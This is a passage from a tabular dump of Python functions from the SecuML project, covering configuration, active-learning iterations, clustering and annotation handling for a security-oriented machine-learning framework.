        self.prev_iter = self.curr_iter
        return False"
ANSSI-FR/SecuML,run_next_iter,"@app.task(base=IterationTask, bind=True, ignore_result=True, queue='SecuMLActiveLearning')
def run_next_iter(self):
    self.iteration_object.run_next_iter()"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser():
    parser = argparse.ArgumentParser(description='Active Learning', formatter_class=argparse.RawTextHelpFormatter)
    ExpConf.gen_parser(parser, filters=True, sparse=True)
    AnnotationsConf.gen_parser(parser, default=None, required=False, message='CSV file containing the initial annotations used to learn the first detection model.')
    subparsers = parser.add_subparsers(dest='strategy')
    subparsers.required = True
    strategies = strategies_conf.get_factory().get_methods()
    for strategy in strategies:
        strategy_parser = subparsers.add_parser(strategy)
        strategies_conf.get_factory().gen_parser(strategy, strategy_parser)
    return parser"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args):
    secuml_conf = ExpConf.secuml_conf_from_args(args)
    dataset_conf = DatasetConf.from_args(args, secuml_conf.logger)
    features_conf = FeaturesConf.from_args(args, secuml_conf.logger)
    annotations_conf = AnnotationsConf(args.annotations_file, None, secuml_conf.logger)
    core_conf = strategies_conf.get_factory().from_args(args.strategy, args, secuml_conf.logger)
    return ActiveLearningConf(secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=args.exp_name)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(conf_json, secuml_conf):
    dataset_conf = DatasetConf.from_json(conf_json['dataset_conf'], secuml_conf.logger)
    features_conf = FeaturesConf.from_json(conf_json['features_conf'], secuml_conf.logger)
    annotations_conf = AnnotationsConf.from_json(conf_json['annotations_conf'], secuml_conf.logger)
    core_conf = strategies_conf.get_factory().from_json(conf_json['core_conf'], secuml_conf.logger)
    conf = ActiveLearningConf(secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=conf_json['name'], parent=conf_json['parent'])
    conf.exp_id = conf_json['exp_id']
    return conf"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser():
    parser = argparse.ArgumentParser(description='Rare Category Detection', formatter_class=argparse.RawTextHelpFormatter)
    ExpConf.gen_parser(parser, filters=True, sparse=True)
    AnnotationsConf.gen_parser(parser, default='init_annotations.csv', required=False, message='CSV file containing the initial annotations used to learn the first supervised detection model.')
    strategies_conf.get_factory().gen_parser('Rcd', parser)
    return parser"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args):
    secuml_conf = ExpConf.secuml_conf_from_args(args)
    logger = secuml_conf.logger
    dataset_conf = DatasetConf.from_args(args, logger)
    features_conf = FeaturesConf.from_args(args, logger)
    annotations_conf = AnnotationsConf(args.annotations_file, None, logger)
    core_conf = strategies_conf.get_factory().from_args('Rcd', args, logger)
    return RcdConf(secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=args.exp_name)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(conf_json, secuml_conf):
    logger = secuml_conf.logger
    dataset_conf = DatasetConf.from_json(conf_json['dataset_conf'], logger)
    features_conf = FeaturesConf.from_json(conf_json['features_conf'], logger)
    annotations_conf = AnnotationsConf.from_json(conf_json['annotations_conf'], logger)
    factory = strategies_conf.get_factory()
    core_conf = factory.from_json(conf_json['core_conf'], logger)
    conf = RcdConf(secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=conf_json['name'], parent=conf_json['parent'])
    conf.exp_id = conf_json['exp_id']
    return conf"
ANSSI-FR/SecuML,check_annotations_with_db,"def check_annotations_with_db(self, exp):
    for instance_id in self.instances.annotations.get_annotated_ids():
        label = self.instances.annotations.get_label(instance_id)
        family = self.instances.annotations.get_family(instance_id)
        annotations_conf = exp.exp_conf.annotations_conf
        annotations_type = annotations_conf.annotations_type
        annotations_id = annotations_conf.annotations_id
        dataset_id = exp.exp_conf.dataset_conf.dataset_id
        annotation = annotations_db_tools.get_annotation(exp.session, annotations_type, annotations_id, dataset_id, instance_id)
        if annotation is None:
            self.update(instance_id, None, None)
        else:
            (DB_label, DB_family) = annotation
            if DB_label != label or DB_family != family:
                self.update(instance_id, DB_label, DB_family)"
ANSSI-FR/SecuML,check_new_annotations_with_db,"def check_new_annotations_with_db(self, exp):
    for instance_id in self.instances.annotations.get_unlabeled_ids():
        annotations_conf = exp.exp_conf.annotations_conf
        annotations_type = annotations_conf.annotations_type
        annotations_id = annotations_conf.annotations_id
        dataset_id = exp.exp_conf.dataset_conf.dataset_id
        annotation = annotations_db_tools.get_annotation(exp.session, annotations_type, annotations_id, dataset_id, instance_id)
        if annotation is not None:
            (DB_label, DB_family) = annotation
            self.update(instance_id, DB_label, DB_family)"
ANSSI-FR/SecuML,save_annotations,"def save_annotations(self, output_filename, exp):
    instances = self.instances.get_annotated_instances()
    export_instances = ExportInstances(instances, exp, user_instance_ids=True)
    export_instances.export_annotations(output_filename)"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp, iter_num, datasets=None, prev_iter=None, budget=None):
    CoreIteration.__init__(self, exp.exp_conf.core_conf, iter_num, datasets=datasets, prev_iter=prev_iter, budget=budget)
    self.exp = exp
    self._set_output_dir()"
ANSSI-FR/SecuML,_set_output_dir,"def _set_output_dir(self):
    self.al_dir = self.exp.output_dir()
    self.iteration_dir = path.join(self.al_dir, str(self.iter_num))"
ANSSI-FR/SecuML,set_query_strategy,"def set_query_strategy(self):
    factory = strategies.get_factory()
    self.strategy = factory.get_strategy(self, self.conf.strategy_name)"
ANSSI-FR/SecuML,init_computations,"def init_computations(self):
    CoreIteration.init_computations(self)
    os.makedirs(self.iteration_dir)
    self.labels_monitoring.export(self.al_dir, self.iteration_dir)"
ANSSI-FR/SecuML,end_monitoring,"def end_monitoring(self):
    CoreIteration.end_monitoring(self)
    self.suggestions_accuracy.export(self.al_dir, self.iteration_dir)"
ANSSI-FR/SecuML,update_model,"def update_model(self):
    self.update_model = UpdateModel(self)
    self.update_model.execute()
    self.update_model.monitoring(self.al_dir, self.iteration_dir)"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self):
    query = self.exp.session.query(ActiveLearningExpAlchemy)
    query = query.filter(ActiveLearningExpAlchemy.id == self.exp.exp_id)
    exp_db = query.one()
    exp_db.current_iter = self.iter_num
    predictions = self.update_model.model_exp.get_predictions('test')
    CoreIteration.generate_queries(self, predictions)
    exp_db.annotations = True
    self._exec_times_monitoring()
    if not self.conf.auto:
        print(display_in_green('\nAnnotation queries for iteration %d have been successfully computed. \nGo to %s to answer the annotation queries. \n' % (self.iter_num, self.strategy.get_url())))"
ANSSI-FR/SecuML,_exec_times_monitoring,"def _exec_times_monitoring(self):
    self.exec_times_monitoring = ExecutionTimesMonitoring(self)
    self.exec_times_monitoring.export(self.al_dir, self.iteration_dir)"
ANSSI-FR/SecuML,answer_queries,"def answer_queries(self):
    if self.conf.auto:
        CoreIteration.answer_queries(self)"
ANSSI-FR/SecuML,update_annotated_instances,"def update_annotated_instances(self):
    self.datasets.new_annotations = False
    self.datasets.check_annotations_with_db(self.exp)
    self.strategy.get_manual_annotations()
    self.datasets.check_new_annotations_with_db(self.exp)
    self.save_annotations()"
ANSSI-FR/SecuML,save_annotations,"def save_annotations(self):
    filename = 'annotations_exp%d_it%d.csv' % (self.exp.exp_conf.exp_id, self.iter_num)
    dataset_conf = self.exp.exp_conf.dataset_conf
    secuml_conf = self.exp.exp_conf.secuml_conf
    filename = path.join(dataset_conf.input_dir(secuml_conf), 'annotations', filename)
    self.datasets.save_annotations(filename, self.exp)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration):
    CoreUpdateModel.__init__(self, iteration)
    self.exp = self.iteration.exp
    self.model_exp = None"
ANSSI-FR/SecuML,execute,"def execute(self):
    name = 'AL%d-Iter%d-main' % (self.exp.exp_id, self.iteration.iter_num)
    features_conf = FeaturesConf(self.exp.exp_conf.features_conf.input_features, self.exp.exp_conf.features_conf.sparse, self.exp.exp_conf.features_conf.logger, filter_in_f=self.exp.exp_conf.features_conf.filter_in_f, filter_out_f=self.exp.exp_conf.features_conf.filter_out_f)
    exp_conf = DiademConf(self.exp.exp_conf.secuml_conf, self.exp.exp_conf.dataset_conf, features_conf, self.exp.exp_conf.annotations_conf, self.model_conf, None, name=name, parent=self.exp.exp_id)
    self.model_exp = DiademExp(exp_conf, session=self.exp.session)
    classifier_type = get_classifier_type(self.model_conf.classifier_conf.__class__)
    cv_monitoring = classifier_type == ClassifierType.supervised
    prev_classifier = None
    prev_iter = self.iteration.prev_iter
    if prev_iter is not None:
        prev_classifier = prev_iter.update_model.classifier
    self.model_exp.run(instances=self.iteration.datasets.instances, cv_monitoring=cv_monitoring, init_classifier=prev_classifier)
    self._set_exec_time()
    self.classifier = self.model_exp.get_train_exp().classifier"
ANSSI-FR/SecuML,_set_exec_time,"def _set_exec_time(self):
    training = self.model_exp.get_train_exp().monitoring
    training_detect = self.model_exp.get_detection_exp('train').monitoring
    detection = self.model_exp.get_detection_exp('test').monitoring
    self.exec_time = training.exec_times.total()
    self.exec_time += sum([m.exec_time.predictions for m in [training_detect, detection]])"
ANSSI-FR/SecuML,monitoring,"def monitoring(self, al_dir, iteration_dir):
    with_validation = self.iteration.conf.validation_conf is not None
    self.monitoring = ModelPerfEvolution(self.iteration.iter_num, self.model_exp, with_validation)
    self.monitoring.generate()
    self.monitoring.export(iteration_dir, al_dir)"
ANSSI-FR/SecuML,create_exp,"def create_exp(self):
    Experiment.create_exp(self)
    self.projection_exp = None
    if self.exp_conf.core_conf is None:
        return
    projection_core_conf = self.exp_conf.core_conf.projection_conf
    if projection_core_conf is not None:
        features_conf = FeaturesConf(self.exp_conf.features_conf.input_features, self.exp_conf.features_conf.sparse, self.exp_conf.secuml_conf.logger)
        projection_conf = ProjectionConf(self.exp_conf.secuml_conf, self.exp_conf.dataset_conf, features_conf, self.exp_conf.annotations_conf, projection_core_conf, name='-'.join([self.exp_conf.name, 'proj']), parent=self.exp_id)
        self.projection_exp = ProjectionExperiment(projection_conf, session=self.session)"
ANSSI-FR/SecuML,get_instances,"def get_instances(self, instances=None):
    instances = Experiment.get_instances(self, instances=instances)
    if self.exp_conf.label != 'all':
        selected_ids = instances.ground_truth.get_annotated_ids(label=self.exp_conf.label)
        instances = instances.get_from_ids(selected_ids)
    if self.projection_exp is not None:
        try:
            instances = self.projection_exp.run(instances=instances, export=False)
        except FewerThanTwoLabels:
            self.exp_conf.logger.warning('There are too few class labels. The instances are not projected before building the clustering.')
    return instances"
ANSSI-FR/SecuML,run,"def run(self, instances=None, drop_annotated_instances=False, quick=False):
    Experiment.run(self)
    instances = self.get_instances()
    core_conf = self.exp_conf.core_conf
    clustering = core_conf.algo(instances, core_conf)
    clustering.fit()
    clustering.generate(drop_annotated_instances=drop_annotated_instances)
    clustering.export(self.output_dir(), quick=quick)"
ANSSI-FR/SecuML,set_clusters,"def set_clusters(self, instances, assigned_clusters, centroids, drop_annotated_instances, cluster_labels):
    Experiment.run(self)
    clustering = Clusters(instances, assigned_clusters)
    clustering.generate(centroids, drop_annotated_instances=drop_annotated_instances, cluster_labels=cluster_labels)
    clustering.export(self.output_dir(), drop_annotated_instances=drop_annotated_instances)"
ANSSI-FR/SecuML,web_template,"def web_template(self):
    return 'clustering/main.html'"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj):
    cluster = ClusterExp()
    cluster.instances_ids = obj['instances_ids']
    cluster.distances = obj['distances']
    cluster.label = obj['label']
    return cluster"
ANSSI-FR/SecuML,get_labels_families,"def get_labels_families(self, exp):
    annotations_type = exp.exp_conf.annotations_conf.annotations_type
    annotations_id = exp.exp_conf.annotations_conf.annotations_id
    dataset_id = exp.exp_conf.dataset_conf.dataset_id
    return annotations_db_tools.get_labels_families(exp.session, annotations_type, annotations_id, dataset_id, instance_ids=self.instances_ids)"
ANSSI-FR/SecuML,get_label_family_ids,"def get_label_family_ids(self, exp, label, family):
    annotations_type = exp.exp_conf.annotations_conf.annotations_type
    annotations_id = exp.exp_conf.annotations_conf.annotations_id
    dataset_id = exp.exp_conf.dataset_conf.dataset_id
    if label == 'unlabeled':
        return annotations_db_tools.get_unlabeled_ids(exp.session, annotations_type, annotations_id, self.instances_ids)
    else:
        return annotations_db_tools.get_label_family_ids(exp.session, annotations_type, annotations_id, dataset_id, label, family, instance_ids=self.instances_ids)"
ANSSI-FR/SecuML,init_clusters_list,"def init_clusters_list(self, num_clusters):
    self.clusters = [ClusterExp() for x in range(num_clusters)]"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(directory):
    clustering = ClustersExp(None, [])
    with open(path.join(directory, 'clusters.json'), 'r') as f:
        obj = json.load(f)
        clustering.assigned_clusters = obj['assigned_clusters']
        clustering.num_clusters = len(obj) - 1
        clustering.clusters = [None for x in range(clustering.num_clusters)]
        for c in range(clustering.num_clusters):
            clustering.clusters[c] = ClusterExp.from_json(obj[str(c)])
    return clustering"
ANSSI-FR/SecuML,get_labels_families,"def get_labels_families(self, exp, selected_cluster):
    cluster = self.clusters[selected_cluster]
    return cluster.get_labels_families(exp)"
ANSSI-FR/SecuML,get_labe_family_ids,"def get_labe_family_ids(self, exp, selected_cluster, label, family):
    return self.clusters[selected_cluster].get_label_family_ids(exp, label, family)"
ANSSI-FR/SecuML,__init__,"def __init__(self, secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=None, parent=None, label='all'):
    ExpConf.__init__(self, secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=name, parent=parent)
    self.label = label"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = ExpConf.fields_to_export(self)
    fields.extend([('label', exportFieldMethod.primitive)])
    return fields"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser():
    parser = argparse.ArgumentParser(description='Clustering of the data for data exploration.')
    ExpConf.gen_parser(parser)
    AnnotationsConf.gen_parser(parser, message='CSV file containing the annotations of some\n                               instances, or GROUND_TRUTH to use the ground\n                               truth annotations stored in idents.csv.\n                               These annotations are used for semi-supervised\n                               projections.')
    parser.add_argument('--label', choices=['all', 'malicious', 'benign'], default='all', help='The clustering is built from all the instances in the\n                         dataset, or only from the benign or malicious ones.\n                         By default, the clustering is built from all the\n                         instances. The malicious and benign instances are\n                         selected according to the ground-truth stored in\n                         idents.csv.')
    subparsers = parser.add_subparsers(dest='algo')
    subparsers.required = True
    factory = clustering_conf.get_factory()
    for algo in factory.get_methods():
        algo_parser = subparsers.add_parser(algo)
        factory.gen_parser(algo, algo_parser)
    return parser"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args):
    secuml_conf = ExpConf.secuml_conf_from_args(args)
    dataset_conf = DatasetConf.from_args(args, secuml_conf.logger)
    features_conf = FeaturesConf.from_args(args, secuml_conf.logger)
    annotations_conf = AnnotationsConf(args.annotations_file, None, secuml_conf.logger)
    core_conf = clustering_conf.get_factory().from_args(args.algo, args, secuml_conf.logger)
    conf = ClusteringConf(secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=args.exp_name, label=args.label)
    return conf"
ANSSI-FR/SecuML,from_json,"def from_json(conf_json, secuml_conf):
    dataset_conf = DatasetConf.from_json(conf_json['dataset_conf'], secuml_conf.logger)
    features_conf = FeaturesConf.from_json(conf_json['features_conf'], secuml_conf.logger)
    annotations_conf = AnnotationsConf.from_json(conf_json['annotations_conf'], secuml_conf.logger)
    core_conf = None
    if conf_json['core_conf'] is not None:
        core_conf = clustering_conf.get_factory().from_json(conf_json['core_conf'], secuml_conf.logger)
    exp_conf = ClusteringConf(secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=conf_json['name'], parent=conf_json['parent'], label=conf_json['label'])
    exp_conf.exp_id = conf_json['exp_id']
    return exp_conf"
ANSSI-FR/SecuML,__init__,"def __init__(self, dataset):
    self.dataset = dataset"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The dataset %s has no ground truth. Ground truth labels and families can be specified in the file idents.csv.' % self.dataset"
ANSSI-FR/SecuML,__init__,"def __init__(self, annotations_filename, annotations_id, logger):
    Conf.__init__(self, logger)
    self.annotations_filename = annotations_filename
    self.annotations_id = None
    self.annotations_type = None
    if annotations_id is not None:
        self.set_annotations_id(annotations_id)
    else:
        self.set_annotations_filename(annotations_filename)"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('annotations_id', exportFieldMethod.primitive), ('annotations_type', exportFieldMethod.enum_value), ('annotations_filename', exportFieldMethod.primitive)]"
ANSSI-FR/SecuML,set_annotations_id,"def set_annotations_id(self, annotations_id):
    self.annotations_id = annotations_id"
ANSSI-FR/SecuML,set_exp_annotations,"def set_exp_annotations(self, annotations_id, annotations_type):
    self.annotations_id = annotations_id
    self.annotations_type = annotations_type"
ANSSI-FR/SecuML,set_annotations_filename,"def set_annotations_filename(self, annotations_filename):
    self.annotations_filename = annotations_filename
    self.set_annotations_type()"
ANSSI-FR/SecuML,set_annotations_type,"def set_annotations_type(self):
    if self.annotations_filename == 'GROUND_TRUTH':
        self.annotations_type = AnnotationsTypes.ground_truth
    elif self.annotations_filename == 'GROUND_TRUTH_IF_EXISTS':
        self.annotations_type = AnnotationsTypes.ground_truth_if_exists
    else:
        self.annotations_type = AnnotationsTypes.partial"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser, default=None, required=False, message=None):
    if message is None:
        message = 'CSV file containing the annotations of some\n                         instances, or GROUND_TRUTH to use the ground\n                         truth annotations stored in idents.csv. '
    parser.add_argument('--annotations', '-a', dest='annotations_file', default=default, required=required, help=message)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(conf_json, logger):
    conf = AnnotationsConf(conf_json['annotations_filename'], conf_json['annotations_id'], logger)
    conf.annotations_type = AnnotationsTypes[conf_json['annotations_type']]
    return conf"
ANSSI-FR/SecuML,__init__,"def __init__(self, project, dataset, logger):
    Conf.__init__(self, logger)
    self.project = project
    self.dataset = dataset
    self.dataset_id = None
    self.has_ground_truth = None"
ANSSI-FR/SecuML,input_dir,"def input_dir(self, secuml_conf):
    return os.path.join(secuml_conf.input_data_dir, self.project, self.dataset)"
ANSSI-FR/SecuML,output_dir,"def output_dir(self, secuml_conf):
    return os.path.join(secuml_conf.output_data_dir, self.project, self.dataset)"
ANSSI-FR/SecuML,set_dataset_id,"def set_dataset_id(self, dataset_id, session):
    self.dataset_id = dataset_id"
ANSSI-FR/SecuML,set_has_ground_truth,"def set_has_ground_truth(self, has_ground_truth):
    self.has_ground_truth = has_ground_truth"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('project', exportFieldMethod.primitive), ('dataset', exportFieldMethod.primitive), ('dataset_id', exportFieldMethod.primitive), ('has_ground_truth', exportFieldMethod.primitive)]"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    parser.add_argument('project')
    parser.add_argument('dataset')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    return DatasetConf(args.project, args.dataset, logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(conf_json, logger):
    conf = DatasetConf(conf_json['project'], conf_json['dataset'], logger)
    conf.dataset_id = conf_json['dataset_id']
    conf.has_ground_truth = conf_json['has_ground_truth']
    return conf"
ANSSI-FR/SecuML,__init__,"def __init__(self, secuml_conf, dataset_conf, features_conf, annotations_conf, core_conf, name=None, parent=None):
    Conf.__init__(self, secuml_conf.logger)
    self.secuml_conf = secuml_conf
    self.dataset_conf = dataset_conf
    self.features_conf = features_conf
    self.annotations_conf = annotations_conf
    self.core_conf = core_conf
    self.name = name
    self.exp_id = None
    self.parent = parent
    self._set_exp_name()"
ANSSI-FR/SecuML,output_dir,"def output_dir(self):
    return path.join(self.dataset_conf.output_dir(self.secuml_conf), str(self.exp_id))"
ANSSI-FR/SecuML,export,"def export(self):
    experiment_dir = self.output_dir()
    os.makedirs(experiment_dir)
    conf_filename = path.join(experiment_dir, 'conf.json')
    with open(conf_filename, 'w') as f:
        json.dump(self.to_json(), f, indent=2)"
ANSSI-FR/SecuML,get_kind,"def get_kind(self):
    return self.__class__.__name__.split('Conf')[0]"
ANSSI-FR/SecuML,_set_exp_name,"def _set_exp_name(self):
    if self.name is not None:
        return
    self.name = self._get_exp_name()"
ANSSI-FR/SecuML,_get_exp_name,"def _get_exp_name(self):
    name = ''
    if self.core_conf is not None:
        name += self.core_conf.get_exp_name()
    if name != '':
        name += '__'
    name += self.features_conf._get_exp_name()
    return name"
ANSSI-FR/SecuML,set_dataset_id,"def set_dataset_id(self, dataset_id, session):
    self.dataset_conf.set_dataset_id(dataset_id, session)"
ANSSI-FR/SecuML,set_exp_id,"def set_exp_id(self, exp_id):
    self.exp_id = exp_id"
ANSSI-FR/SecuML,set_exp_annotations,"def set_exp_annotations(self, annotations_id, annotations_type):
    self.annotations_conf.set_exp_annotations(annotations_id, annotations_type)"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('dataset_conf', exportFieldMethod.obj), ('features_conf', exportFieldMethod.obj), ('annotations_conf', exportFieldMethod.obj), ('core_conf', exportFieldMethod.obj), ('name', exportFieldMethod.primitive), ('parent', exportFieldMethod.primitive), ('exp_id', exportFieldMethod.primitive)]"
ANSSI-FR/SecuML,secuml_conf_from_args,"@staticmethod
def secuml_conf_from_args(args):
    return SecuMLConf(args.secuml_conf)"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser, filters=True, sparse=False):
    DatasetConf.gen_parser(parser)
    parser.add_argument('--exp-name', type=str, required=False, default=None, help='Name of the experiment. If not provided, a default name is automatically generated from the input parameters.')
    parser.add_argument('--secuml-conf', type=str, required=False, default=None, help='YAML file containing the configuration. If not set, the configuration is read from the file stored in the environment variable SECUMLCONF.')
    FeaturesConf.gen_parser(parser, filters=filters, sparse=sparse)"
ANSSI-FR/SecuML,__init__,"def __init__(self, input_features, sparse, logger, filter_in_f=None, filter_out_f=None, streaming=False, stream_batch=None):
    Conf.__init__(self, logger)
    self.input_features = input_features
    self.sparse = sparse
    self.filter_in_f = filter_in_f
    self.filter_out_f = filter_out_f
    self.streaming = streaming
    self.stream_batch = stream_batch
    self.input_type = None
    self.set_id = None
    self.files = None
    self.info = None"
ANSSI-FR/SecuML,_get_exp_name,"def _get_exp_name(self):
    name = ''
    if self.sparse:
        name = 'sparse'
    name += 'Features_%s' % path.splitext(self.input_features)[0]
    if self.filter_in_f is not None:
        name += '_FilterIn_%s' % path.splitext(self.filter_in_f)[0]
    elif self.filter_out_f is not None:
        name += '_FilterOut_%s' % path.splitext(self.filter_out_f)[0]
    return name"
ANSSI-FR/SecuML,set_input_type,"def set_input_type(self, input_type):
    self.input_type = input_type"
ANSSI-FR/SecuML,set_set_id,"def set_set_id(self, set_id):
    self.set_id = set_id"
ANSSI-FR/SecuML,set_info,"def set_info(self, info):
    self.info = info"
ANSSI-FR/SecuML,set_files,"def set_files(self, files):
    self.files = files"
ANSSI-FR/SecuML,deepcopy,"def deepcopy(self):
    features_conf = FeaturesConf(self.input_features, self.sparse, self.logger, filter_in_f=self.filter_in_f, filter_out_f=self.filter_out_f, streaming=self.streaming, stream_batch=self.stream_batch)
    features_conf.set_input_type(self.input_type)
    features_conf.set_set_id(self.set_id)
    features_conf.set_info(self.info)
    features_conf.set_files(self.files)
    return features_conf"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('input_features', exportFieldMethod.primitive), ('sparse', exportFieldMethod.primitive), ('input_type', exportFieldMethod.enum_value), ('set_id', exportFieldMethod.primitive), ('files', exportFieldMethod.primitive), ('info', exportFieldMethod.obj), ('filter_in_f', exportFieldMethod.primitive), ('filter_out_f', exportFieldMethod.primitive)]"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser, filters=True, sparse=False):
    group = parser
    if filters or sparse:
        group = parser.add_argument_group('Features')
    group.add_argument('--features', '-f', dest='input_features', required=False, default='features.csv', help='CSV file containing the features or a directory. In the latter case, all the files of the directory are concatenated to build the input features. Default: features.csv. ')
    if sparse:
        group.add_argument('--sparse', required=False, default=False, action='store_true', help='CSR, CSC and LIL scipy sparse matrices are accepted.')
    if filters:
        filter_group = group.add_mutually_exclusive_group()
        filter_group.add_argument('--filter-in', required=False, default=None, help='File containing the features to use. File format: one feature id per line. ')
        filter_group.add_argument('--filter-out', required=False, default=None, help='File containing the features to filter out. File format: one feature id per line. ')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    filter_in_f = None
    filter_out_f = None
    sparse = False
    if hasattr(args, 'filter_in'):
        filter_in_f = args.filter_in
        filter_out_f = args.filter_out
    if hasattr(args, 'sparse'):
        sparse = args.sparse
    return FeaturesConf(args.input_features, sparse, logger, filter_in_f=filter_in_f, filter_out_f=filter_out_f)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(conf_json, logger):
    conf = FeaturesConf(conf_json['input_features'], conf_json['sparse'], logger, filter_in_f=conf_json['filter_in_f'], filter_out_f=conf_json['filter_out_f'])
    conf.set_input_type(conf_json['input_type'])
    conf.set_set_id(conf_json['set_id'])
    conf.set_info(FeaturesInfo.from_json(conf_json['info']))
    conf.set_files(conf_json['files'])
    return conf"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'No configuration file provided. \nThe environment variable SECUMLCONF must be set to the path of the configuration file.'"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The configuration file must contain absolute paths for input_data_dir and output_data_dir.'"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The URI of the database (MySQL or PostgreSQL) must be specified in the secuml configuration file.\nMySQL databases: ""mysql+mysqlconnector://<user>:<password>@<host>/<db_name>""\npostgresql databases: postgresql://<user>:<password>@<host>/<db_name>""'"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf_filename):
    conf_filename = self.get_conf_filename(conf_filename)
    self._set_conf(conf_filename)
    self._set_session()"
ANSSI-FR/SecuML,_set_conf,"def _set_conf(self, conf_filename):
    with open(conf_filename, 'r') as ymlfile:
        cfg = yaml.safe_load(ymlfile)
        self.set_directories(cfg['input_data_dir'], cfg['output_data_dir'])
        self.set_db_uri(cfg['db_uri'])
        self._set_logger(cfg)
        self._set_host_port(cfg)"
ANSSI-FR/SecuML,_set_session,"def _set_session(self):
    self.engine = self.get_engine()
    Base.metadata.create_all(self.engine)
    self.Session = sessionmaker(bind=self.engine)"
ANSSI-FR/SecuML,_set_logger,"def _set_logger(self, cfg):
    logger_level = 'INFO'
    if 'logger_level' in cfg:
        logger_level = cfg['logger_level']
    logger_output = None
    if 'logger_output' in cfg:
        logger_output = cfg['logger_output']
    (self.logger, self.log_handler) = get_logger('SecuML', logger_level, logger_output)"
ANSSI-FR/SecuML,_set_host_port,"def _set_host_port(self, cfg):
    self.host = 'localhost'
    if 'host' in cfg:
        self.host = cfg['host']
    self.port = 8080
    if 'port' in cfg:
        self.port = int(cfg['port'])"
ANSSI-FR/SecuML,close_log_handler,"def close_log_handler(self):
    close_logger(self.logger, self.log_handler)"
ANSSI-FR/SecuML,set_directories,"def set_directories(self, input_data_dir, output_data_dir):
    self._check_directories(input_data_dir, output_data_dir)
    self.input_data_dir = input_data_dir
    self.output_data_dir = output_data_dir
    self.secuml_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))"
ANSSI-FR/SecuML,_check_directories,"def _check_directories(self, input_data_dir, output_data_dir):
    for d in [input_data_dir, output_data_dir]:
        if not os.path.isabs(d):
            raise ConfRelativePaths()"
ANSSI-FR/SecuML,get_conf_filename,"def get_conf_filename(self, conf_filename):
    if conf_filename is not None:
        return conf_filename
    else:
        try:
            return os.environ['SECUMLCONF']
        except KeyError:
            raise SecumlConfMissing()"
ANSSI-FR/SecuML,set_db_uri,"def set_db_uri(self, db_uri):
    self.check_db_uri(db_uri)
    self.db_uri = db_uri"
ANSSI-FR/SecuML,check_db_uri,"def check_db_uri(self, db_uri):
    self.db_type = None
    if db_uri.find('mysql+mysqlconnector://') == 0:
        self.db_type = 'mysql'
    elif db_uri.find('postgresql://') == 0:
        self.db_type = 'postgresql'
    else:
        raise WrongDatabase()"
ANSSI-FR/SecuML,get_engine,"def get_engine(self):
    return call_specific_db_func(self.db_type, 'get_engine', (self.db_uri,))"
ANSSI-FR/SecuML,get_dataset_ids_timestamps,"def get_dataset_ids_timestamps(session, dataset_id):
    query = session.query(InstancesAlchemy)
    query = query.filter(InstancesAlchemy.dataset_id == dataset_id)
    query = query.order_by(InstancesAlchemy.id)
    return zip(*[(r.id, r.timestamp) for r in query.all()])"
ANSSI-FR/SecuML,compute_hash,"def compute_hash(filename, kind='md5'):
    BLOCKSIZE = 65536
    if kind == 'md5':
        hasher = hashlib.md5()
    elif kind == 'sha1':
        hasher = hashlib.sha1()
    else:
        assert False
    with open(filename, 'rb') as f:
        buf = f.read(BLOCKSIZE)
        while len(buf) > 0:
            hasher.update(buf)
            buf = f.read(BLOCKSIZE)
    return hasher.hexdigest()"
ANSSI-FR/SecuML,__init__,"def __init__(self, dataset_conf, annotations_conf, secuml_conf, session):
    self.dataset_conf = dataset_conf
    self.annotations_conf = annotations_conf
    self.secuml_conf = secuml_conf
    self.session = session"
ANSSI-FR/SecuML,load,"def load(self):
    annotations_id = self.annotations_conf.annotations_id
    if annotations_id is None:
        annotations_id = self.add_exp_annotations_in_db()
        annotations_type = self.annotations_conf.annotations_type
        if annotations_type == AnnotationsTypes.ground_truth_if_exists and (not self.dataset_conf.has_ground_truth):
            annotations_type = AnnotationsTypes.partial
            self.annotations_conf.annotations_type = annotations_type
            self.annotations_conf.annotations_filename = None
        if annotations_type == AnnotationsTypes.partial:
            filename = self.annotations_conf.annotations_filename
            self.load_partial_annotations(filename, annotations_id)
    else:
